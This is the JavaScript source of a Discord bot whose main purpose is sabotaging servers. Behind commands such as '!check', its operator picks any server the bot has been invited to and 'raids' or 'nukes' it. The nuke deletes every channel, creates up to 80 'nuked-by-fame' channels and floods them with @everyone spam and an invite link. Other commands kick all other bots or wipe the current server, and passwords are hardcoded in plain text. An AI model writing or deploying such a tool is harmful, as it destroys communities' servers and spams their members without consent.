const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

// Session storage
const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // !movebootser
  if (content === '!movebootser') {
    const embed = new EmbedBuilder()
      .setColor('#ff00ff')
      .setTitle('🔄 !MOVEBOOT SER')
      .setDescription('This will move the Booster role underneath role ID `1513349804141445120`.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`movebootser_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }

  // !nukeback
  if (content === '!nukeback') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('☢️ NUKE SERVER')
      .setDescription('This will **delete all channels and categories** and create a single channel called `chat`.\n\n**This action is irreversible!**')
      .setFooter({ text: 'Only use if you know what you\'re doing' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`nukeback_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }

  // !ate
  if (content === '!ate') {
    const embed = new EmbedBuilder()
      .setColor('#ff8800')
      .setTitle('👢 KICK ALL BOTS')
      .setDescription('This will kick every bot from the server (except this one).')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`ate_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }

  // !check - Remote Control
  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select any server the bot is in and perform **Raid** or **Nuke**.\n\nPassword required.')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Start')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userIdFromId = parts[parts.length - 1];

    if (interaction.user.id !== userIdFromId) {
      return interaction.reply({ 
        content: '❌ This interaction belongs to someone else.', 
        ephemeral: true 
      });
    }

    // ====================== MOVEBOOTSER ======================
    if (action === 'movebootser') {
      if (interaction.isButton() && interaction.customId.startsWith('movebootser_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`movebootser_modal_${interaction.user.id}`)
          .setTitle('Enter Password');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ));
        return await interaction.showModal(modal);
      }

      if (interaction.isModalSubmit() && interaction.customId.startsWith('movebootser_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });

        const guild = interaction.guild;
        const boosterRole = guild.roles.cache.get('1429174538754592778');
        const targetRole = guild.roles.cache.get('1513349804141445120');

        if (!boosterRole) return interaction.reply({ content: '❌ Booster role not found.', ephemeral: true });
        if (!targetRole) return interaction.reply({ content: '❌ Target role not found.', ephemeral: true });

        await boosterRole.setPosition(targetRole.position - 1);
        await interaction.reply({ content: `✅ Successfully moved **${boosterRole.name}**!`, ephemeral: true });
      }
    }

    // ====================== NUKEBACK ======================
    else if (action === 'nukeback') {
      if (interaction.isButton() && interaction.customId.startsWith('nukeback_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`nukeback_modal_${interaction.user.id}`)
          .setTitle('NUKE PASSWORD');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ));
        return await interaction.showModal(modal);
      }

      if (interaction.isModalSubmit() && interaction.customId.startsWith('nukeback_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });

        const guild = interaction.guild;
        await interaction.reply({ content: '☢️ Nuking this server...', ephemeral: true });

        for (const channel of guild.channels.cache.values()) {
          await channel.delete().catch(() => {});
        }

        const newChannel = await guild.channels.create({ name: 'chat', type: 0 });
        await newChannel.send('# Server has been nuked and reset.');
      }
    }

    // ====================== ATE ======================
    else if (action === 'ate') {
      if (interaction.isButton() && interaction.customId.startsWith('ate_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`ate_modal_${interaction.user.id}`)
          .setTitle('KICK BOTS PASSWORD');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ));
        return await interaction.showModal(modal);
      }

      if (interaction.isModalSubmit() && interaction.customId.startsWith('ate_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });

        const guild = interaction.guild;
        await interaction.reply({ content: '👢 Kicking all bots...', ephemeral: true });

        let kicked = 0;
        const members = await guild.members.fetch();
        for (const member of members.values()) {
          if (member.user.bot && member.id !== client.user.id) {
            await member.kick('Nuke command').catch(() => {});
            kicked++;
          }
        }
        await interaction.followUp({ content: `✅ Kicked **${kicked}** bots.`, ephemeral: true });
      }
    }

    // ====================== CHECK (REMOTE) ======================
    else if (action === 'check') {
      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
        const modal = new ModalBuilder()
          .setCustomId(`check_modal_${interaction.user.id}`)
          .setTitle('Enter Password');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ));
        return await interaction.showModal(modal);
      }

      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== MAIN_PASSWORD) {
          return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
        }

        const guilds = Array.from(client.guilds.cache.values());
        if (guilds.length === 0) return interaction.reply({ content: '❌ Bot is not in any servers.', ephemeral: true });

        const options = guilds.map(g => ({
          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
          value: g.id,
          description: `${g.memberCount} members`
        }));

        const select = new StringSelectMenuBuilder()
          .setCustomId(`check_server_select_${interaction.user.id}`)
          .setPlaceholder('Select target server')
          .addOptions(options);

        await interaction.reply({
          content: '✅ Password accepted. Select a server:',
          components: [new ActionRowBuilder().addComponents(select)],
          ephemeral: true
        });

        userSessions.set(interaction.user.id, {});
      }

      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
        const selectedGuildId = interaction.values[0];
        const guild = client.guilds.cache.get(selectedGuildId);
        if (!guild) return interaction.reply({ content: '❌ Server not found.', ephemeral: true });

        userSessions.set(interaction.user.id, { guildId: selectedGuildId });

        const actionSelect = new StringSelectMenuBuilder()
          .setCustomId(`check_action_select_${interaction.user.id}`)
          .setPlaceholder('Choose action')
          .addOptions([
            { label: '🔥 Raid', value: 'raid' },
            { label: '☢️ Nuke', value: 'nuke' }
          ]);

        await interaction.update({
          content: `**Selected:** ${guild.name}\nChoose action:`,
          components: [new ActionRowBuilder().addComponents(actionSelect)]
        });
      }

      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
        const selectedAction = interaction.values[0];
        const session = userSessions.get(interaction.user.id);
        if (!session?.guildId) return;

        if (selectedAction === 'raid') {
          const modal = new ModalBuilder()
            .setCustomId(`check_raid_modal_${interaction.user.id}`)
            .setTitle('Raid Message');
          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('raid_message')
              .setLabel('Message to spam')
              .setStyle(TextInputStyle.Paragraph)
              .setRequired(true)
              .setMaxLength(1800)
          ));
          return await interaction.showModal(modal);
        }

        if (selectedAction === 'nuke') {
          const modal = new ModalBuilder()
            .setCustomId(`check_nuke_modal_${interaction.user.id}`)
            .setTitle('Confirm Nuke');
          modal.addComponents(new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId('password')
              .setLabel('Nuke Password')
              .setStyle(TextInputStyle.Short)
              .setRequired(true)
          ));
          return await interaction.showModal(modal);
        }
      }

      // Raid Modal
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_raid_modal_')) {
        const raidMessage = interaction.fields.getTextInputValue('raid_message');
        const session = userSessions.get(interaction.user.id);
        const guild = client.guilds.cache.get(session?.guildId);
        if (!guild) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });

        await interaction.reply({ content: `🚀 Raiding **${guild.name}**...`, ephemeral: true });

        const channels = guild.channels.cache.filter(c => c.type === 0);
        for (const ch of channels.values()) {
          for (let i = 0; i < 6; i++) {
            ch.send(raidMessage).catch(() => {});
          }
        }
        await interaction.followUp({ content: `✅ Raid sent in ${channels.size} channels.`, ephemeral: true });
        userSessions.delete(interaction.user.id);
      }

      // ==================== ENHANCED NUKE ====================
      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
        const password = interaction.fields.getTextInputValue('password');
        if (password !== NUKE_PASSWORD) {
          return interaction.reply({ content: '❌ Wrong nuke password.', ephemeral: true });
        }

        const session = userSessions.get(interaction.user.id);
        const guild = client.guilds.cache.get(session?.guildId);
        if (!guild) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });

        await interaction.reply({ content: `☢️ **Starting full nuke on ${guild.name}...**`, ephemeral: true });

        try {
          await interaction.followUp({ content: '🗑️ Deleting all channels...', ephemeral: true });
          for (const channel of guild.channels.cache.values()) {
            await channel.delete().catch(() => {});
          }

          await interaction.followUp({ content: '🔨 Creating NUKED BY FAME channels...', ephemeral: true });
          const createdChannels = [];

          for (let i = 0; i < 80; i++) {
            try {
              const newChan = await guild.channels.create({
                name: `nuked-by-fame-${i}`,
                type: 0,
                reason: 'Nuke by Fame'
              });
              createdChannels.push(newChan);
            } catch (e) { break; }
          }

          await interaction.followUp({ content: '💥 Starting massive spam...', ephemeral: true });

          const spamTexts = [
            '@everyone **BET$ UNLOCKED** 🔥 FAME REAL FAME',
            'fucked by veynetta https://discord.gg/NANQMy3WnD',
            '@everyone **NUKED BY FAME** https://discord.gg/NANQMy3WnD',
            'REAL FAME BETS UNLOCKED https://discord.gg/NANQMy3WnD'
          ];

          for (const channel of createdChannels) {
            for (let i = 0; i < 12; i++) {
              const msg = spamTexts[Math.floor(Math.random() * spamTexts.length)];
              channel.send(msg).catch(() => {});
            }
          }

          if (createdChannels.length > 0) {
            const last = createdChannels[createdChannels.length - 1];
            for (let i = 0; i < 25; i++) {
              last.send('@everyone **FAME REAL FAME** https://discord.gg/NANQMy3WnD').catch(() => {});
            }
          }

          await interaction.followUp({ 
            content: `✅ **NUKE COMPLETE**\n• Created **${createdChannels.length}** channels\n• Spamming @everyone + invite`, 
            ephemeral: true 
          });
        } catch (err) {
          console.error(err);
          await interaction.followUp({ content: '⚠️ Nuke partially completed (rate limits).', ephemeral: true });
        }

        userSessions.delete(interaction.user.id);
      }
    }

  } catch (error) {
    console.error('Interaction error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
